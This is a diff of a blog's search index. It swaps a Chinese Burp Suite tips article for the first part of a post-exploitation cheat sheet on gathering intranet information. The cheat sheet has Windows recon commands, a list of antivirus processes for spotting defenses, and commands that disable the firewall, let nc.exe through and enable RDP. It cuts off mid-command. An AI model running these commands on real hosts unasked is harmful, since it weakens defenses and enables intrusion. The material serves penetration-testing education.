@@ -17,154 +17,971 @@
       </tags>
   </entry>
   <entry>
-    <title>浅析Burpsuite作战工具</title>
-    <url>/2022/03/15/burpSuite%E6%8A%80%E5%B7%A7/</url>
-    <content><![CDATA[<h2 id="浅析Burpsuite作战工具"><a href="#浅析Burpsuite作战工具" class="headerlink" title="浅析Burpsuite作战工具"></a>浅析Burpsuite作战工具</h2><p>直入burp右键菜单中的Engagement tools，中文翻译为作战工具。</p>
-<p><img src="https://image.3001.net/images/20220316/16474135901411.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>从上往下依次为</p>
+    <title>内网信息收集</title>
+    <url>/2022/04/10/2%20%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="1-收集本机信息"><a href="#1-收集本机信息" class="headerlink" title="1 收集本机信息"></a>1 收集本机信息</h2><h3 id="1-1-手动收集信息"><a href="#1-1-手动收集信息" class="headerlink" title="1.1 手动收集信息"></a>1.1 手动收集信息</h3><p>查询网络配置信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure>
+
+<p>查询操作系统和版本信息</p>
 <a id="more"></a>
 
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Search                        搜索 </span><br><span class="line">Find Comments                 查找注释 </span><br><span class="line">Find scripts                  查找js代码 </span><br><span class="line">Find references               查找引用 </span><br><span class="line">Analyze target                分析目标 </span><br><span class="line">Discover content              内容勘测 </span><br><span class="line">Schedule </span><br><span class="line">task                 定时任务 </span><br><span class="line">Simulate manual testing       人工模拟</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure>
 
-<p>以上翻译属于个人理解，非字面意思。如有不同见解，欢迎交流。</p>
-<p>依次聊一下个人的使用心得：</p>
-<h3 id="0x01-Search-搜索"><a href="#0x01-Search-搜索" class="headerlink" title="0x01 Search 搜索"></a>0x01 Search 搜索</h3><p>在选定的上右键打开后默认如下：</p>
-<p><img src="https://image.3001.net/images/20220316/16474135943154.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>输入字符串即可查找需要的字符串，相当于浏览器view-source后再Ctrl + F查找字符串。</p>
-<p>如果只用到这里的话有点不太黑阔，正则搜索这么强大，不用可惜了。</p>
-<p>贴一条自己常用的正则：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(.user|pass|accessKeyId|accessKeySecret|secretToken|callback|admin|config|key|access|token?)</span><br></pre></td></tr></table></figure>
+<p>查询系统体系结构</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://image.3001.net/images/20220316/16474135982917.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>擅用该功能，在SRC捡洞可能可能只是一个习惯而已。（比如每次准备关Burp之前考虑全选site map中所有的站点，再拿正则去尝试一下。）</p>
-<h3 id="0x02-Find-Comments-查找注释"><a href="#0x02-Find-Comments-查找注释" class="headerlink" title="0x02 Find Comments 查找注释"></a>0x02 Find Comments 查找注释</h3><p>选择目标右键打开后如下图：</p>
-<p><img src="https://image.3001.net/images/20220316/16474136027286.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p><img src="https://image.3001.net/images/20220316/16474136058233.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>可以理解为Search功能的正则写为:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--(.*?)--&gt;</span><br></pre></td></tr></table></figure>
+<p>查看安装的软件及版本、路径等</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>
 
-<p>不同语言的注释不一样，burp内置的正则更为全面。测试过程中适当看一下注释内容，没准一个未授权就出来了。</p>
-<h3 id="0x03-Find-scripts-查找js代码"><a href="#0x03-Find-scripts-查找js代码" class="headerlink" title="0x03 Find scripts 查找js代码"></a>0x03 Find scripts 查找js代码</h3><p>选择目标右键打开后如下图：</p>
-<p><img src="https://image.3001.net/images/20220316/1647413609989.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p><img src="https://image.3001.net/images/20220316/16474136131894.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>该功能处理.js后缀的文件之外，页面中script标签的内容也会自动匹配出来。等同于右键看完当前页面的js逻辑后在接着Ctrl F 搜.js然后继续看代码，在Burp里相对方便得多。</p>
-<h3 id="0x04-Find-references-查找引用"><a href="#0x04-Find-references-查找引用" class="headerlink" title="0x04 Find references 查找引用"></a>0x04 Find references 查找引用</h3><p>选择目标右键打开后如下图：</p>
-<p><img src="https://image.3001.net/images/20220316/16474136199626.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p><img src="https://image.3001.net/images/20220316/16474136228492.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>如果用过<a href="http://cn-sec.com/wp-content/themes/begin-lts-1/inc/go.php?url=https://github.com/TheKingOfDuck/myScripts/tree/master/LinksDumper" target="_blank" rel="noopener">LinksDumper</a>的话会发现Burp这个功能和它一模一样，都是匹配出页面中存在的各类链接。</p>
-<p>默认自带的功能还有不少人是去用插件或者用独立的程序跑。burp自带的它不香咩？</p>
-<h3 id="0x05-Analyze-target-分析目标"><a href="#0x05-Analyze-target-分析目标" class="headerlink" title="0x05 Analyze target 分析目标"></a>0x05 Analyze target 分析目标</h3><p>选择目标右键打开后总共有四个页面</p>
-<p>1.总结页面：</p>
-<p><img src="https://image.3001.net/images/20220316/16474136255179.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>假设拿到100个目标，筛选软柿子的时候通过总结页面判断一下，寻找交互点多的站点/链接进行单点突破，未尝不是一个高效的选择。</p>
-<p>2.动态Urls：</p>
-<p><img src="https://image.3001.net/images/20220316/16474136298874.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>该功能可以快速筛选出带外部参数的url，并统计了参数的数量，秉着交互点越多可能存在的问题就越多的原则，筛选一下，效率++。</p>
-<p>3.其他Url：</p>
-<p><img src="https://image.3001.net/images/20220316/16474136336622.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>该功能可以理解为Find references功能遍历出来所有的连接后再去除Dynamic URLs中带交互点的Url的结果。</p>
-<p>4.参数统计：</p>
-<p><img src="https://image.3001.net/images/20220316/16474136372563.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>首先是统计了出现过那些参数，其次是这些参数在Url里面出现过次数。有了这个功能在瓶颈渗透提取本站存在的参数时根本不需要第三方插件工具辅助，直接复制name字段即可；某个参数存在漏洞后也可通过该功能查找其他可能存在相同问题的Url。</p>
-<h3 id="0x06-Discover-content-内容勘测"><a href="#0x06-Discover-content-内容勘测" class="headerlink" title="0x06 Discover content 内容勘测"></a>0x06 Discover content 内容勘测</h3><p>该功能秒杀一切目录扫描工具。</p>
-<p>下面是关于如何巧用它去递归扫描站点备份的：</p>
-<p>此前在米斯特<code>BurpSuite 插件生态开发组</code>里有提到想开发一款主动的备份扫描插件，寄生于<code>BurpSuite</code>强大的爬虫功能对每个目录/文件进行备份扫描。写一半发现<code>BurpSuite</code>本来就有这样的功能，只是很少有人用到罢了，本文仅对相关功能进行简要的分析以及优化。</p>
-<h4 id="0x06-1-简介"><a href="#0x06-1-简介" class="headerlink" title="0x06_1 简介"></a>0x06_1 简介</h4><p>正常访问时爬虫被动收集到的目录:</p>
-<p><img src="https://image.3001.net/images/20220316/16474136416411.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>下面是本文的主角：</p>
-<p><img src="https://image.3001.net/images/20220316/16474136457433.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>位于<code>Engagement tools</code> ==&gt; <code>Discover content</code></p>
-<p>看看默认配置：</p>
-<p><img src="https://image.3001.net/images/20220316/1647413649976.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>图中圈起来的第一部分默认勾选了burp内置的四个字典,第二个圈也是默认配置,其作用时从站点中提取各种目录并递归扫描,前面的配置可根据情况修改,后面不建议动它。</p>
-<p><img src="https://image.3001.net/images/20220316/16474136522713.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>默认配置就是这四项了，下面具体分析一下他扫描的流量，取其精华。</p>
-<h4 id="0x06-2-扫描分析"><a href="#0x06-2-扫描分析" class="headerlink" title="0x06_2 扫描分析"></a>0x06_2 扫描分析</h4><p>流程1:</p>
-<p><img src="https://image.3001.net/images/20220316/16474136561110.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>先去除所有文件的后缀以及提取目录名当作文件扫一遍。</p>
-<p>流程2:</p>
-<p><img src="https://image.3001.net/images/20220316/1647413659623.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>在所有去了后缀的文件名后面加上<code>Test these extentsions</code>配置中的所有后缀并进行扫描，在已知站点语言的情况下此处明显多了很多无效流量。</p>
-<p>流程3:</p>
-<p><img src="https://image.3001.net/images/20220316/16474136623333.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>将流程1中的所有文件名当作目录扫一遍。</p>
-<p>流程4:</p>
-<p><img src="https://image.3001.net/images/20220316/16474136646207.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>按照配置中Filenames中的字典顺序依次遍历并结合流程2的方式遍历文件。</p>
-<p>流程5:</p>
-<p>依次在每层目录执行一遍流程1-4，如果新目录或文件发现就添加到列队里面。</p>
-<h4 id="0x06-3-优化扫描"><a href="#0x06-3-优化扫描" class="headerlink" title="0x06_3 优化扫描"></a>0x06_3 优化扫描</h4><p><img src="https://image.3001.net/images/20220316/16474136684966.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>缺陷很明显，仅仅三个目录三个文件总共请求了14048次，流量超过20M。</p>
-<p>递归扫描产生的无效流量太多了。</p>
-<p>首要原因出现在:</p>
-<p><img src="https://image.3001.net/images/20220316/16474136702333.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>大多数时候，已知语言情况下完全没必要吧所有后缀都跑一遍，留特定语言以及相关后缀。如st2时加上.action/.do,流量去掉大半。</p>
-<p>其次出现在:</p>
-<p><img src="https://image.3001.net/images/20220316/1647413672801.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>此处主要针对扫备份，原生字典长这样:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bac BAC backup BACKUP bak BAK conf cs csproj gz inc INC ini java log lst old OLD orig ORIG sav save tar temp tmp TMP vb vbproj zip $$$ -OLD -old 0 1 ~1 ~bk</span><br></pre></td></tr></table></figure>
+<p>利用PowerShell命令，收集软件的版本信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure>
 
-<p>主要针对国外的站吧。这里提供一份。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">txt md xml db 7z rar zip gz tar tar.gz sql bak swp old properties inc ini mdb mdf conf config log rar</span><br></pre></td></tr></table></figure>
+<p>查询本机服务信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>
 
-<p>最后是字典的选择：</p>
-<p><img src="https://image.3001.net/images/20220316/16474136759015.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>burp内置的4个字典内容重复率极高，比如about这个词在四个字典里都分别出现了…四个字典共3266个，去重后2265个。</p>
-<p>结果保存在：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;TheKingOfDuck&#x2F;myScripts&#x2F;master&#x2F;burp_dir.txt</span><br></pre></td></tr></table></figure>
+<p>查询进程列表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure>
 
-<p>文件名方面推荐：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;TheKingOfDuck&#x2F;myScripts&#x2F;master&#x2F;burp_filenames.txt</span><br></pre></td></tr></table></figure>
+<p>常见杀毒软件进程</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;360tray.exe&quot;,    &quot;360安全卫士&quot;&#125;,</span><br><span class="line">&#123;&quot;360sd.exe&quot;,      &quot;360杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;a2guard.exe&quot;,    &quot;a-squared杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;ad-watch.exe&quot;,    &quot;Lavasoft杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;cleaner8.exe&quot;,    &quot;The Cleaner杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;vba32lder.exe&quot;,    &quot;vb32杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;MongoosaGUI.exe&quot;,    &quot;Mongoosa杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;CorantiControlCenter32.exe&quot;,    &quot;Coranti2012杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;F-PROT.EXE&quot;,    &quot;F-PROT杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;CMCTrayIcon.exe&quot;,    &quot;CMC杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;K7TSecurity.exe&quot;,    &quot;K7杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;UnThreat.exe&quot;,    &quot;UnThreat杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;CKSoftShiedAntivirus4.exe&quot;,    &quot;Shield Antivirus杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;AVWatchService.exe&quot;,    &quot;VIRUSfighter杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;ArcaTasksService.exe&quot;,    &quot;ArcaVir杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;iptray.exe&quot;,    &quot;Immunet杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;PSafeSysTray.exe&quot;,    &quot;PSafe杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;nspupsvc.exe&quot;,    &quot;nProtect杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;SpywareTerminatorShield.exe&quot;,    &quot;SpywareTerminator杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;BKavService.exe&quot;,    &quot;Bkav杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;MsMpEng.exe&quot;,    &quot;Microsoft Security Essentials&quot;&#125;,</span><br><span class="line">&#123;&quot;SBAMSvc.exe&quot;,    &quot;VIPRE&quot;&#125;,</span><br><span class="line">&#123;&quot;ccSvcHst.exe&quot;,    &quot;Norton杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;QQ.exe&quot;,    &quot;QQ&quot;&#125;,</span><br><span class="line">&#123;&quot;f-secure.exe&quot;,    &quot;冰岛&quot;&#125;,</span><br><span class="line">&#123;&quot;avp.exe&quot;,        &quot;卡巴斯基&quot;&#125;,</span><br><span class="line">&#123;&quot;KvMonXP.exe&quot;,    &quot;江民杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;RavMonD.exe&quot;,    &quot;瑞星杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;Mcshield.exe&quot;,   &quot;麦咖啡&quot;&#125;,</span><br><span class="line">&#123;&quot;egui.exe&quot;,       &quot;NOD32&quot;&#125;,</span><br><span class="line">&#123;&quot;kxetray.exe&quot;,    &quot;金山毒霸&quot;&#125;, </span><br><span class="line">&#123;&quot;knsdtray.exe&quot;,   &quot;可牛杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;avcenter.exe&quot;,   &quot;Avira(小红伞)&quot;&#125;,</span><br><span class="line">&#123;&quot;ashDisp.exe&quot;,    &quot;Avast网络安全&quot;&#125;, </span><br><span class="line">&#123;&quot;rtvscan.exe&quot;,    &quot;诺顿杀毒&quot;&#125;, </span><br><span class="line">&#123;&quot;ksafe.exe&quot;,      &quot;金山卫士&quot;&#125;, </span><br><span class="line">&#123;&quot;QQPCRTP.exe&quot;,    &quot;QQ电脑管家&quot;&#125;,</span><br><span class="line">&#123;&quot;Miner.exe&quot;,    &quot;流量矿石&quot;&#125;,</span><br><span class="line">&#123;&quot;AYAgent.aye&quot;,    &quot;韩国胶囊&quot;&#125;,</span><br><span class="line">&#123;&quot;patray.exe&quot;,    &quot;安博士&quot;&#125;,</span><br><span class="line">&#123;&quot;V3Svc.exe&quot;,    &quot;安博士V3&quot;&#125;,</span><br><span class="line">&#123;&quot;avgwdsvc.exe&quot;,    &quot;AVG杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;ccSetMgr.exe&quot;,    &quot;赛门铁克&quot;&#125;,</span><br><span class="line">&#123;&quot;QUHLPSVC.EXE&quot;,    &quot;QUICK HEAL杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;mssecess.exe&quot;,    &quot;微软杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;SavProgress.exe&quot;,    &quot;Sophos杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;fsavgui.exe&quot;,    &quot;F-Secure杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;vsserv.exe&quot;,    &quot;比特梵德&quot;&#125;,</span><br><span class="line">&#123;&quot;remupd.exe&quot;,    &quot;熊猫卫士&quot;&#125;,</span><br><span class="line">&#123;&quot;FortiTray.exe&quot;,    &quot;飞塔&quot;&#125;,</span><br><span class="line">&#123;&quot;safedog.exe&quot;,    &quot;安全狗&quot;&#125;,</span><br><span class="line">&#123;&quot;parmor.exe&quot;,    &quot;木马克星&quot;&#125;,</span><br><span class="line">&#123;&quot;beikesan.exe&quot;,    &quot;贝壳云安全&quot;&#125;,</span><br><span class="line">&#123;&quot;KSWebShield.exe&quot;,    &quot;金山网盾&quot;&#125;,</span><br><span class="line">&#123;&quot;TrojanHunter.exe&quot;,    &quot;木马猎手&quot;&#125;,</span><br><span class="line">&#123;&quot;GG.exe&quot;,    &quot;巨盾网游安全盾&quot;&#125;,</span><br><span class="line">&#123;&quot;adam.exe&quot;,    &quot;绿鹰安全精灵&quot;&#125;,</span><br><span class="line">&#123;&quot;AST.exe&quot;,    &quot;超级巡警&quot;&#125;,</span><br><span class="line">&#123;&quot;ananwidget.exe&quot;,    &quot;墨者安全专家&quot;&#125;,</span><br><span class="line">&#123;&quot;AVK.exe&quot;,    &quot;GData&quot;&#125;,</span><br><span class="line">&#123;&quot;ccapp.exe&quot;,    &quot;Symantec Norton&quot;&#125;,</span><br><span class="line">&#123;&quot;avg.exe&quot;,    &quot;AVG Anti-Virus&quot;&#125;,</span><br><span class="line">&#123;&quot;spidernt.exe&quot;,    &quot;Dr.web&quot;&#125;,</span><br><span class="line">&#123;&quot;Mcshield.exe&quot;,    &quot;Mcafee&quot;&#125;,</span><br><span class="line">&#123;&quot;avgaurd.exe&quot;,    &quot;Avira Antivir&quot;&#125;,</span><br><span class="line">&#123;&quot;F-PROT.exe&quot;,    &quot;F-Prot AntiVirus&quot;&#125;,</span><br><span class="line">&#123;&quot;vsmon.exe&quot;,    &quot;ZoneAlarm&quot;&#125;,</span><br><span class="line">&#123;&quot;avp.exee&quot;,    &quot;Kaspersky&quot;&#125;,</span><br><span class="line">&#123;&quot;cpf.exe&quot;,    &quot;Comodo&quot;&#125;,</span><br><span class="line">&#123;&quot;outpost.exe&quot;,    &quot;Outpost Firewall&quot;&#125;,</span><br><span class="line">&#123;&quot;rfwmain.exe&quot;,    &quot;瑞星防火墙&quot;&#125;,</span><br><span class="line">&#123;&quot;kpfwtray.exe&quot;,    &quot;金山网镖&quot;&#125;,</span><br><span class="line">&#123;&quot;FYFireWall.exe&quot;,    &quot;风云防火墙&quot;&#125;,</span><br><span class="line">&#123;&quot;MPMon.exe&quot;,    &quot;微点主动防御&quot;&#125;,</span><br><span class="line">&#123;&quot;pfw.exe&quot;,    &quot;天网防火墙&quot;&#125;,</span><br><span class="line">&#123;&quot;S.exe&quot;,    &quot;在抓鸡&quot;&#125;,</span><br><span class="line">&#123;&quot;1433.exe&quot;,    &quot;在扫1433&quot;&#125;,</span><br><span class="line">&#123;&quot;DUB.exe&quot;,    &quot;在爆破&quot;&#125;,</span><br><span class="line">&#123;&quot;ServUDaemon.exe&quot;,    &quot;发现S-U&quot;&#125;,</span><br><span class="line">&#123;&quot;BaiduSdSvc.exe&quot;,    &quot;百度杀软&quot;&#125;,</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://image.3001.net/images/20220316/16474136786007.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>如此一来在扫描目录的过程也可把备份一并扫了。</p>
-<p><img src="https://image.3001.net/images/20220316/16474136857031.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<h3 id="0x07-Schedule-task-定时任务"><a href="#0x07-Schedule-task-定时任务" class="headerlink" title="0x07 Schedule task 定时任务"></a>0x07 Schedule task 定时任务</h3><p>选择目标右键打开后如下图：</p>
-<p><img src="https://image.3001.net/images/20220316/16474136884430.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p><img src="https://image.3001.net/images/20220316/16474137024957.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>定时任务，没啥特别的值得说。</p>
-<h3 id="0x08-Simulate-manual-testing-人工模拟"><a href="#0x08-Simulate-manual-testing-人工模拟" class="headerlink" title="0x08 Simulate manual testing 人工模拟"></a>0x08 Simulate manual testing 人工模拟</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This function sends common test payloads to random URL s and parameters at irregular intervals, to generate traflic similar to that caused by manual penetration testing. Its only real use is to let you take a break from testing while still looking busy according to the server&#39;s logs. Only items which you selected in the site map will be requested.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全狗：</span><br><span class="line">SafeDogGuardCenter.exe</span><br><span class="line">safedogupdatecenter.exe</span><br><span class="line">safedogguardcenter.exe</span><br><span class="line">SafeDogSiteIIS.exe</span><br><span class="line">SafeDogTray.exe</span><br><span class="line">SafeDogServerUI.exe</span><br><span class="line"></span><br><span class="line">D盾：</span><br><span class="line">D_Safe_Manage.exe</span><br><span class="line">d_manage.exe</span><br><span class="line"></span><br><span class="line">云锁：</span><br><span class="line">yunsuo_agent_service.exe</span><br><span class="line">yunsuo_agent_daemon.exe</span><br><span class="line"></span><br><span class="line">护卫神：</span><br><span class="line">HwsPanel.exe  护卫神·入侵防护系统（状态托盘）</span><br><span class="line">hws_ui.exe    护卫神·入侵防护系统</span><br><span class="line">hws.exe       护卫神·入侵防护系统 服务处理程序</span><br><span class="line">hwsd.exe      护卫神·入侵防护系统 监控组件</span><br><span class="line"></span><br><span class="line">火绒：</span><br><span class="line">hipstray.exe</span><br><span class="line">wsctrl.exe</span><br><span class="line">usysdiag.exe</span><br><span class="line"></span><br><span class="line">趋势科技：</span><br><span class="line">TMBMSRV.exe</span><br><span class="line">ntrtscan.exe</span><br><span class="line">PCCNTMON.exe</span><br><span class="line">TMLISTEN.exe</span><br></pre></td></tr></table></figure>
 
-<p>正如功能描述中所说的，这是一个懒人挖洞选项。</p>
-<p><img src="https://image.3001.net/images/20220316/16474137084162.png" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>缺陷很明显，不会自动寻找并提交表单，只能依托于已有的表单/参数的基础上进行探测，相当于一款被动扫描器。结合Discover content使用，法力无边。</p>
-<h3 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h3><p>熟练使用这些作战功能，扫描器从此是路人。</p>
-<h2 id="配置Intruder预定义Payload列表"><a href="#配置Intruder预定义Payload列表" class="headerlink" title="配置Intruder预定义Payload列表"></a>配置Intruder预定义Payload列表</h2><p>预定义Payload列表在这里可以看见：</p>
-<p><img src="https://image.3001.net/images/20220316/16474137124590.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>在Tab栏中有选项可以配置-<code>Configure predefined payload lists</code>：</p>
-<p><img src="https://image.3001.net/images/20220316/16474137187837.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>选择Payload列表目录（注：<strong>需将常用的字典都放在一个目录里面</strong>）：</p>
-<p><img src="https://image.3001.net/images/20220316/16474137213012.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<h2 id="自定义插入点进行扫描"><a href="#自定义插入点进行扫描" class="headerlink" title="自定义插入点进行扫描"></a>自定义插入点进行扫描</h2><p>将请求报文转发至Intruder，选择扫描的插入点：<code>Add$</code></p>
-<p><img src="https://image.3001.net/images/20220316/16474137247444.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<p>右键选择<code>Scan defined insertion points</code></p>
-<p><img src="https://image.3001.net/images/20220316/16474137284112.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
-<hr>
-<p>参考链接：<a href="https://gh0st.cn/archives/2020-02-13/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2020-02-13/1</a></p>
+<p>查看启动程序信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure>
+
+<p>查看计划任务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>
+
+<p>查看主机开机时间</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>
+
+<p>查询用户列表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本机用户列表：</span><br><span class="line">net user</span><br><span class="line">本地管理员（通常包含域用户）信息：</span><br><span class="line">net localgroup administrators</span><br><span class="line">查看当前在线用户</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>
+
+<p>列出或断开本地计算机与所连接的客户端之间的会话</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>
+
+<p>查询端口列表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p>查看补丁列表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+<p>查询本机共享列表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>
+
+<p>查询路由表及所有可用接口的ARP缓存表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+
+<p>查询防火墙相关配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关闭防火墙：</span><br><span class="line">win2003以前的版本：netsh firewall set opmode disable</span><br><span class="line">win2003以后的版本：netsh advfirewall set allprofiles state off</span><br><span class="line">查看防火墙配置：</span><br><span class="line">netsh firewall show config</span><br><span class="line">修改防火墙配置：</span><br><span class="line">win2003以前的版本：netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line">win2003以后的版本：netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;c:\nc.exe&quot;</span><br><span class="line">允许指定程序退出：netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;c:\nc.exe&quot;</span><br><span class="line">允许3389端口放行：netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line">自定义防火墙日志的储存位置：</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\window\temp\fw.log&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查看代理配置情况</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查询并开启远程连接服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看远程连接端口：</span><br><span class="line">Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; &#x2F;v portnumber</span><br><span class="line">win2003中开启3389：</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">win2008和win2012中开启3389：</span><br><span class="line">wmic &#x2F;namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t 